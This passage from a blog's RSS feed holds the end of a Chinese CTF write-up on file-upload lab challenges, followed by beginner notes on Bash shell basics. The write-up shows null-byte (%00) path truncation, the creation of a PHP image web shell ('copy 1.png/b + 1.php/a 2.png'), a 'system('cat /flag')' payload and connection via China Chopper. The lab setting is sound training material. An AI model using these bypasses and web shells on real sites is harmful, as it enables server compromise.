&lt;li&gt;然后我们使用&lt;code&gt;%00&lt;/code&gt;进行截断，截断的原理是什么呢？
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;%00&lt;/code&gt;的作用类似于C语言中的&lt;code&gt;\0&lt;/code&gt;结束符，后面的不读&lt;/li&gt;
&lt;li&gt;如上图所示，如果我们使用&lt;code&gt;1.jpg&lt;/code&gt;进行上传，如果没有问题，上传后的文件所在路径就自动拼接为&lt;code&gt;/upload/1.jpg&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;然而&lt;code&gt;jpg&lt;/code&gt;文件不能使我们运行木马，我们需要使用截断的方式构造&lt;code&gt;1.php&lt;/code&gt;文件，并使得后面的&lt;code&gt;1.jpg&lt;/code&gt;失效&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705194332.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;文件上传成功，右键复制路径&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705194431.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;上面复制的文件路径为&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;http://47.103.137.68:7153/upload/1.php%EF%BF%BD/5220200702193403.jpg
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;去掉&lt;code&gt;%&lt;/code&gt;开始的内容，使用菜刀连接&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705194523.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;发现flag文件，找到flag&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705194628.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;flag{df66cb42}&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&#34;上传实验室-p13&#34;&gt;上传实验室-p13&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;首先源码审计，发现和上一道题好像没有什么不同&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705194655.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;那我们接着传文件，抓包看看有什么不同，发现这次两个路径都是&lt;code&gt;post&lt;/code&gt;传过去的&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705194803.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;那么我们依旧使用截断，这里的不同就是，&lt;code&gt;post&lt;/code&gt;不能像&lt;code&gt;ge&lt;/code&gt;t一样对&lt;code&gt;%00&lt;/code&gt;进行解码，我们直接在&lt;code&gt;hex&lt;/code&gt;中修改截断为&lt;code&gt;00&lt;/code&gt;，如下图所示&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705194856.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;以及下图&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705195005.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;修改完毕&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705195106.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;放包，发现上传成功，右键复制路径&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705195130.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;路径如下&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;http://47.103.137.68:7047/upload/1.php%EF%BF%BD/5220200702195130.jpg
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;去掉&lt;code&gt;%&lt;/code&gt;及后面内容，连接菜刀成功&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705195229.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;发现&lt;code&gt;flag&lt;/code&gt;文件，找到&lt;code&gt;flag&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705195338.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;flag{0c369020}&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&#34;上传实验室-p14&#34;&gt;上传实验室-p14&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;首先源代码审计，发现是很正常的文件类型判断&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705195401.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;同时题目有提示上传图片马&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705195424.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;那么我们先制作图片马&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;copy 1.png/b + 1.php/a 2.png
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;制作完毕后，发现是一页乱码和我们上传的图片，试了很多文件包含，发现无果&lt;/li&gt;
&lt;li&gt;经过很久的尝试，我还是决定在图片马中写入&lt;code&gt;phpinfo()&lt;/code&gt;函数，看看有什么反应，发现首页就进行了响应&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705195452.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;那么我们就要思考了，所谓的文件包含是不是已经实现了呢，而我们直接利用插入的&lt;code&gt;php&lt;/code&gt;代码即可&lt;/li&gt;
&lt;li&gt;于是修改&lt;code&gt;php&lt;/code&gt;代码为&lt;code&gt;&amp;lt;?php system(&#39;cat /flag&#39;);?&amp;gt;&lt;/code&gt;，再次上传图片马看看&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705195515.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;发现flag&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;flag{9af4ddc1}&lt;/p&gt;
&lt;p&gt;虽然&lt;code&gt;wp&lt;/code&gt;写的简单，但试了真的非常非常非常非常非常多次&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&#34;上传实验室-p15&#34;&gt;上传实验室-p15&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;发现首页提示一样&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705195550.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;源码审计发现也是判断文件类型&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;直接上传刚才做好的图片马，发现读出了flag&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705195621.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;flag{7267acf0}&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&#34;上传实验室-p16&#34;&gt;上传实验室-p16&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;和上一道题一样，发现首页也一样&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705195653.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;发现源代码也是判断文件类型&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705195722.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;直接上传图片马试试看，发现&lt;code&gt;flag&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705195804.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;flag{16f60bb2}&lt;/p&gt;
&lt;/blockquote&gt;
- https://b40du.github.io/posts/writeup-chaitin-upload_labs-01/ - This is a customized copyright.</description>
        </item>
    
    
    
        <item>
        <title>笔记-Shell基础</title>
        <link>https://b40du.github.io/posts/note-imooc-shell-basic/</link>
        <pubDate>Thu, 14 May 2020 23:34:19 +0800</pubDate>
        
        <guid>https://b40du.github.io/posts/note-imooc-shell-basic/</guid>
        <description>爆肚的杂货铺 https://b40du.github.io/posts/note-imooc-shell-basic/ -&lt;h1 id=&#34;shell编程一&#34;&gt;Shell编程（一）&lt;/h1&gt;
&lt;h1 id=&#34;一shell概述&#34;&gt;一、Shell概述&lt;/h1&gt;
&lt;h2 id=&#34;1-shell的介绍&#34;&gt;1. Shell的介绍&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Shell是一个命令行解释器，它为用户提供了一个向Linux内核发送请求以便运行程序的界面系统级程序，用户可以用Shell来启动、挂起、停止甚至是编写一些程序。&lt;/li&gt;
&lt;li&gt;Shell还是一个功能强大的编程语言，易编写，易调试，灵活性较强。Shell是解释执行的脚本语言，在Shell中可以直接调用Linux系统命令。
&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200514171037.png&#34; alt=&#34;&#34;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;2-shell的分类&#34;&gt;2. Shell的分类&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Shell的两种主要语法类型有Bourne和C，这两种语法彼此不兼容。Bourne家族主要包括sh、ksh、Bash、psh、zsh；C家族主要包括：csh、tcsh。
&lt;ul&gt;
&lt;li&gt;Bourne Shell：从1979年起Unix就开始使用Bourne Shell，Bourne Shell的主文件名为sh。&lt;/li&gt;
&lt;li&gt;C Shell：C Shell主要在BSD版的Unix系统中使用，其语法和C语言相类似而得名&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;查看当前系统使用的shell
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;echo $SHELL
/bin/bash
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;Bash：Bash与sh兼容，现在使用的Linux就是使用Bash作为用户的基本Shell&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;3-linux支持的shell&#34;&gt;3. Linux支持的Shell&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;/etc/shells&lt;/code&gt;&lt;/strong&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 打开这个文件&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;root@localhost ~&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# vi /etc/shells&lt;/span&gt;
/bin/sh
/bin/bash
/sbin/nologin
/bin/tcsh
/bin/csh
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;root@localhost ~&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# sh&lt;/span&gt;
sh-4.1# exit
exit
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;root@localhost ~&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# csh&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;root@localhost ~&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# exit  # 进程管理的时候可以知道我们进入了哪个shell&lt;/span&gt;
exit                      &lt;span style=&#34;color:#75715e&#34;&gt;# 一个shell中可以调用其他shell，也可以调用子shell&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;root@localhost ~&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# bash  # windows中打开cmd，就是在Windows当中调用一个子的shell&lt;/span&gt;
exit
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;二脚本执行方式&#34;&gt;二、脚本执行方式&lt;/h1&gt;
&lt;h2 id=&#34;21-echo输出命令&#34;&gt;2.1 echo输出命令&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;echo [选项] [输出内容]&lt;/strong&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Where are you from?&amp;#34;&lt;/span&gt;
Where are you from
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;选项&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;-e: 支持反斜线控制的字符转换
&lt;ul&gt;
&lt;li&gt;删除左侧字符
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;root@localhost ~&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# echo -e &amp;#34;Where are\b you from?&amp;#34;&lt;/span&gt;
Where ar you from?
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;制表符与换行符
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;root@localhost ~&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# echo -e &amp;#34;h\te\tl\nl\to&amp;#34;&lt;/span&gt;
h   e   l
l   o
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;按照十六进制ASCII码也同样可以输出
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;root@localhost ~&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# echo -e &amp;#34;\x68\tx65\t\x6c\n\x6c\t\x6f\t&amp;#34;&lt;/span&gt;
h   e   l
l   o
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;输出颜色
&lt;ul&gt;
&lt;li&gt;30m=黑色，31m=红色，32m=绿色，33m=黄色&lt;/li&gt;
&lt;li&gt;34m=蓝色，35m=洋红，36m=青色，37m=白色&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;root@localhost ~&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# echo -e &amp;#34;\e[1;31m 你说什么 \e[0m&amp;#34;&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;\e[1;31m&lt;/code&gt; 开启颜色显示&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;控制字符&lt;/th&gt;
&lt;th&gt;作用&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;\a&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;输出警告音&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;\b&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;退格键，也就是向左删除键&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;\n&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;换行符&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;\r&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;回车键&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;\t&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;制表符，也就是Tab键&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;\v&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;垂直制表符&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;\0nnn&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;按照八进制ASCII码表输出字符。其中0为数字零，nnn是三位八进制数。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;xhh&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;按照十六进制ASCII码表输出字符。其中hh是两位十六进制数。&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;22-第一个脚本&#34;&gt;2.2 第一个脚本&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;root@localhost sh&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# vim hello.sh&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#!/bin/bash # 好像是环境配置&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#The first program 这是第一个shell脚本&lt;/span&gt;

echo -e &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\e[1;34m 天上掉下个林妹妹！\e[0m&amp;#34;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;23-脚本执行&#34;&gt;2.3 脚本执行&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;赋予执行权限，直接运行&lt;/strong&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;chmod &lt;span style=&#34;color:#ae81ff&#34;&gt;755&lt;/span&gt; hello.sh
./hello.sh
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;通过Bash调用执行脚本&lt;/strong&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;bash hello.sh
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;三bash的基本功能&#34;&gt;三、Bash的基本功能&lt;/h1&gt;
&lt;h2 id=&#34;31-命令别名与快捷键&#34;&gt;3.1 命令别名与快捷键&lt;/h2&gt;
&lt;h3 id=&#34;311-什么是别名&#34;&gt;3.1.1 什么是别名&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;命令别名==人的小明&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;312-查看与设定别名&#34;&gt;3.1.2 查看与设定别名&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;alias&lt;/code&gt;&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;查看系统中所有的命令别名
&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200514204246.png&#34; alt=&#34;&#34;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;alias 别名= &#39;原命令&#39;&lt;/code&gt;&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;设定命令别名
&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200514204323.png&#34; alt=&#34;&#34;&gt;&lt;/li&gt;
&lt;li&gt;敲vi变vim
&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200514204656.png&#34; alt=&#34;&#34;&gt;
&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200514204731.png&#34; alt=&#34;&#34;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;313-别名永久生效与删除别名&#34;&gt;3.1.3 别名永久生效与删除别名&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;vi ~/.bashrc&lt;/code&gt;&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;写入环境变量配置文件
&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200514205414.png&#34; alt=&#34;&#34;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;unalias 别名&lt;/code&gt;&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;删除别名&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;314-命令生效顺序&#34;&gt;3.1.4 命令生效顺序&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;第一顺位执行用绝对路径或相对路径执行的命令&lt;/li&gt;
&lt;li&gt;第二顺位执行别名&lt;/li&gt;
&lt;li&gt;第三顺位执行Bash的内部命令&lt;/li&gt;
&lt;li&gt;第四顺位执行按照$PATH环境变量定义的目录查找顺序找到的第一个命令&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;315-常用快捷键&#34;&gt;3.1.5 常用快捷键&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;Ctrl+C&lt;/code&gt;&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;强制终止当前命令&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;Ctrl+l&lt;/code&gt;&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;清屏&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;Ctrl+a&lt;/code&gt;&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;光标移动到命令行首&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;Ctrl+e&lt;/code&gt;&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;光标移动到命令行尾&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;Ctrl+u&lt;/code&gt;&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;从光标所在位置删除到行首&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;Ctrl+z&lt;/code&gt;&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;把命令放入后台&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;Ctrl+r&lt;/code&gt;&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;在历史命令中搜索&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;32-历史命令&#34;&gt;3.2 历史命令&lt;/h2&gt;
&lt;h3 id=&#34;321-历史命令&#34;&gt;3.2.1 历史命令&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;history [选项] [历史命令保存文件]&lt;/code&gt;&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;选项&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;-c&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;清空历史命令&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-w&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;把缓存中的历史命令写入历史命令保存文件~/.bash_history&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;历史命令默认会保存1000条，可以在环境变量配置文件/etc/profile中进行修改&lt;/strong&gt;
&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200514212628.png&#34; alt=&#34;&#34;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;322-历史命令的调用&#34;&gt;3.2.2 历史命令的调用&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;使用 上/下 箭头调用以前的历史命令&lt;/li&gt;
